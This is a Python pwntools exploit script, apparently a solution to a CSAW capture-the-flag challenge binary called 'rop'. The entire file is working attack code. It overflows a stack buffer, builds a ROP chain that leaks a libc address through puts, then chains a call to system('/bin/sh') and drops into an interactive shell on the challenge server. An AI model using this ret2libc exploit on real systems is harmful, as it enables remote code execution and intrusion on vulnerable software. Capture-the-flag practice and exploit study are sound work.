from pwn import *

e = ELF("./rop")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.chal.csaw.io", 5016)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

rdi = 0x400683
p.sendlineafter("Hello", "A" * 0x28 + p64(rdi) + p64(e.got["gets"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"]))

p.recvline()
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["gets"]

print(hex(leak))

p.sendlineafter("Hello", "A" * 0x28 + p64(rdi + 1) + p64(rdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))

p.interactive()
